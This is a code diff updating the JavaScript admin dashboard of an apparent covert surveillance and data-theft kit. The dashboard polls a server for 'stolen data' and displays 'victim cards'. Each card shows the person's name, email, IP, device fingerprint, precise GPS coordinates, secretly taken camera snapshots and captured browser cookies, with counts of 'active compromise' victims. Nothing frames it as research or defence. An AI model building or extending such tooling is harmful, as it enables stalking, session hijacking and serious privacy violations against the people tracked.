@@ -1,91 +1,184 @@
 document.addEventListener('DOMContentLoaded', () => {
-    
-    // Admin Dashboard Initialization
-    // We only poll for data here now.
-    // 2. Poll for Stolen Data
-    const tableBody = document.getElementById('tableBody');
-    const totalCount = document.getElementById('totalCount');
-    let knownDataLength = 0; // Keep track so we can animate *new* rows
+    const feedCards = document.getElementById('feed-cards');
+    const detailPanel = document.getElementById('detail-panel');
+    const totalEl = document.getElementById('total-victims');
+    const activeEl = document.getElementById('active-victims');
+    const gpsEl = document.getElementById('gps-victims');
 
-    function fetchStolenData() {
-        fetch('/api/data')
-            .then(response => response.json())
-            .then(data => {
-                if (!data) return;
-                
-                // Update header count
-                totalCount.textContent = data.length;
+    let knownSessionIds = new Set();
+    let allData = [];
 
-                // If no changes, do nothing.
-                if (data.length === knownDataLength) return;
-
-                // If we went from 0 to 1+, clear the empty state
-                if (knownDataLength === 0 && data.length > 0) {
-                    tableBody.innerHTML = ''; 
-                }
-
-                // Render *only* the new items by iterating from known length to new length.
-                // We prepend to table body so newest is at top.
-                for (let i = knownDataLength; i < data.length; i++) {
-                    const entry = data[i];
-                    const meta = entry.metadata || {};
-                    
-                    // Format Time safely
-                    let timeStr = 'Unknown';
-                    if (entry.timestamp) {
-                        try {
-                            const d = new Date(entry.timestamp);
-                            timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-                        } catch (e) {
-                            timeStr = entry.timestamp;
-                        }
-                    }
-
-                    // Extract a shorter User Agent string (just browser/os rough guess)
-                    let browserStr = meta.userAgent || 'Unknown';
-                    // Very simple heuristic to shorten UA string for table display
-                    if (browserStr.includes('Chrome')) browserStr = 'Chrome ' + (browserStr.includes('Mobile') ? '(Mobile)' : '(Desktop)');
-                    else if (browserStr.includes('Safari') && !browserStr.includes('Chrome')) browserStr = 'Safari ' + (browserStr.includes('Mobile') ? '(Mobile)' : '(Desktop)');
-                    else if (browserStr.includes('Firefox')) browserStr = 'Firefox';
-                    else if (browserStr.includes('Edge')) browserStr = 'Edge';
-
-                    // Parse Platform
-                    let platStr = meta.platform || 'Unknown';
-                    
-                    const statusHtml = entry.status === 'SILENT_CAPTURE' 
-                        ? '<span style="color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem;">SILENT</span>'
-                        : '<span style="color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">ACTIVE COMPROMISE</span>';
-
-                    let locStr = '<span style="color: #64748b; font-size: 0.85rem;">IP Only</span>';
-                    if (entry.location) {
-                        locStr = `<a href="https://www.google.com/maps?q=${entry.location.lat},${entry.location.lon}" target="_blank" style="color: #38bdf8; text-decoration: none; font-size: 0.9rem;" title="Accuracy: ${Math.round(entry.location.accuracy)}m"><i class="fa-solid fa-location-dot"></i> Precise GPS</a>`;
-                    }
-
-                    const row = document.createElement('tr');
-                    row.className = 'new-entry'; // Triggers CSS animation highlight
-                    row.innerHTML = `
-                        <td title="${entry.timestamp}">${timeStr}</td>
-                        <td style="color: #cbd5e1; font-weight: bold;">${entry.ip}</td>
-                        <td>${statusHtml}</td>
-                        <td title="${meta.userAgent || ''}">${browserStr}</td>
-                        <td style="color: #a3e635;">${meta.battery || 'Unknown'}</td>
-                        <td>${locStr}</td>
-                    `;
-                    
-                    // Prepend to top
-                    tableBody.insertBefore(row, tableBody.firstChild);
-                }
-
-                // Update our tracker
-                knownDataLength = data.length;
-            })
-            .catch(error => {
-                console.error("Error fetching data:", error);
-            });
+    function formatTime(ts) {
+        try {
+            return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        } catch { return ts; }
     }
 
-    // Poll every 2 seconds
-    setInterval(fetchStolenData, 2000);
-    // Initial fetch
-    fetchStolenData();
+    function shortenBrowser(ua) {
+        if (!ua) return 'Unknown';
+        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome' + (ua.includes('Mobile') ? ' Mobile' : '');
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari' + (ua.includes('Mobile') ? ' Mobile' : '');
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Edg')) return 'Edge';
+        return ua.split(' ')[0];
+    }
+
+    function renderCard(entry) {
+        const meta = entry.metadata || {};
+        const isActive = entry.status === 'ACTIVE_COMPROMISE';
+        const card = document.createElement('div');
+        card.className = `victim-card ${isActive ? 'active-card' : 'silent-card'} slide-in`;
+        card.dataset.sessionId = entry.sessionId;
+
+        const nameDisplay = meta.userName ? `<div class="vc-name">${meta.userName}</div>` : '';
+        const emailDisplay = meta.userEmail ? `<div class="vc-email">${meta.userEmail}</div>` : '';
+        const thumbDisplay = entry.base64Image ? `<img src="${entry.base64Image}" class="vc-thumb" alt="Camera">` : '';
+        const gpsDisplay = entry.location ? `<span class="vc-badge" style="color:#10b981;">📍 GPS</span>` : '';
+
+        card.innerHTML = `
+            <div class="vc-header">
+                <div>
+                    <div class="vc-ip">${entry.ip}</div>
+                    ${nameDisplay}
+                    ${emailDisplay}
+                </div>
+                <span class="vc-status ${isActive ? 'status-active' : 'status-silent'}">${isActive ? '⚡ ACTIVE' : '👁 SILENT'}</span>
+            </div>
+            <div class="vc-time">${formatTime(entry.timestamp)}</div>
+            <div class="vc-meta">
+                <span class="vc-badge">${shortenBrowser(meta.userAgent)}</span>
+                <span class="vc-badge">${meta.battery || '?'}</span>
+                <span class="vc-badge">${meta.screenSize || '?'}</span>
+                ${gpsDisplay}
+            </div>
+            ${thumbDisplay}
+        `;
+        
+        card.addEventListener('click', () => {
+            document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('active'));
+            card.classList.add('active');
+            renderDetail(entry);
+        });
+
+        return card;
+    }
+
+    function renderDetail(entry) {
+        const meta = entry.metadata || {};
+        const loc = entry.location;
+
+        const gpsHtml = loc
+            ? `<a class="gps-link" href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank">📍 ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${Math.round(loc.accuracy)}m) — Open in Maps</a>`
+            : '<span style="color:#64748b;">Not captured</span>';
+
+        const photoHtml = entry.base64Image
+            ? `<img src="${entry.base64Image}" class="camera-img" alt="Camera Capture">`
+            : `<div style="color:#334155;padding:2rem;text-align:center;">No camera capture yet</div>`;
+
+        const cookieHtml = meta.cookies
+            ? `<div class="cookie-block">${meta.cookies}</div>`
+            : `<div class="cookie-block" style="color:#475569;">No cookies captured</div>`;
+
+        detailPanel.innerHTML = `
+            <!-- IDENTITY -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-id-card"></i> &nbsp;Identity</h3>
+                <div class="detail-grid">
+                    <div class="detail-field"><label>Full Name</label><span class="danger">${meta.userName || '—'}</span></div>
+                    <div class="detail-field"><label>Email</label><span class="danger">${meta.userEmail || '—'}</span></div>
+                    <div class="detail-field"><label>IP Address</label><span>${entry.ip}</span></div>
+                    <div class="detail-field"><label>Session ID</label><span>${entry.sessionId}</span></div>
+                    <div class="detail-field"><label>Timestamp</label><span>${entry.timestamp}</span></div>
+                    <div class="detail-field"><label>Timezone</label><span>${meta.timeZone || '—'}</span></div>
+                </div>
+            </div>
+
+            <!-- DEVICE FINGERPRINT -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-fingerprint"></i> &nbsp;Device Fingerprint</h3>
+                <div class="detail-grid">
+                    <div class="detail-field"><label>Platform</label><span>${meta.platform || '—'}</span></div>
+                    <div class="detail-field"><label>Browser</label><span>${shortenBrowser(meta.userAgent)}</span></div>
+                    <div class="detail-field"><label>Screen</label><span>${meta.screenSize || '—'} @ ${meta.colorDepth || '—'}</span></div>
+                    <div class="detail-field"><label>Language</label><span>${meta.language || '—'}</span></div>
+                    <div class="detail-field"><label>Battery</label><span class="danger">${meta.battery || '—'}</span></div>
+                    <div class="detail-field"><label>Referrer</label><span>${meta.referrer || 'Direct'}</span></div>
+                </div>
+                <div class="detail-field" style="margin-top:0.75rem;">
+                    <label>Full User Agent</label>
+                    <span style="font-size:0.75rem;">${meta.userAgent || '—'}</span>
+                </div>
+            </div>
+
+            <!-- GPS -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-location-dot"></i> &nbsp;GPS Location</h3>
+                ${gpsHtml}
+            </div>
+
+            <!-- CAMERA -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-camera"></i> &nbsp;Camera Snapshot</h3>
+                ${photoHtml}
+            </div>
+
+            <!-- COOKIES -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-cookie"></i> &nbsp;Browser Cookies Captured</h3>
+                ${cookieHtml}
+            </div>
+        `;
+    }
+
+    function updateStats(data) {
+        totalEl.textContent = data.length;
+        activeEl.textContent = data.filter(e => e.status === 'ACTIVE_COMPROMISE').length;
+        gpsEl.textContent = data.filter(e => !!e.location).length;
+    }
+
+    function fetchData() {
+        fetch('/api/data')
+            .then(r => r.json())
+            .then(data => {
+                if (!data) return;
+                allData = data;
+                updateStats(data);
+
+                // Add new cards
+                data.forEach(entry => {
+                    if (!entry.sessionId) return;
+
+                    // If we already have this session card, update it in-place
+                    const existingCard = feedCards.querySelector(`[data-session-id="${entry.sessionId}"]`);
+                    if (existingCard) {
+                        // Re-render card if status changed
+                        const wasActive = existingCard.classList.contains('active-card');
+                        const isNowActive = entry.status === 'ACTIVE_COMPROMISE';
+                        if (!wasActive && isNowActive) {
+                            const newCard = renderCard(entry);
+                            feedCards.insertBefore(newCard, existingCard);
+                            existingCard.remove();
+
+                            // If this card was selected in detail, refresh it
+                            if (existingCard.classList.contains('active')) {
+                                newCard.classList.add('active');
+                                renderDetail(entry);
+                            }
+                        }
+                    } else {
+                        // New session - prepend
+                        const placeholder = feedCards.querySelector('.placeholder-msg');
+                        if (placeholder) placeholder.remove();
+
+                        const card = renderCard(entry);
+                        feedCards.insertBefore(card, feedCards.firstChild);
+                        knownSessionIds.add(entry.sessionId);
+                    }
+                });
+            })
+            .catch(err => console.error(err));
+    }
+
+    setInterval(fetchData, 2000);
+    fetchData();
 });
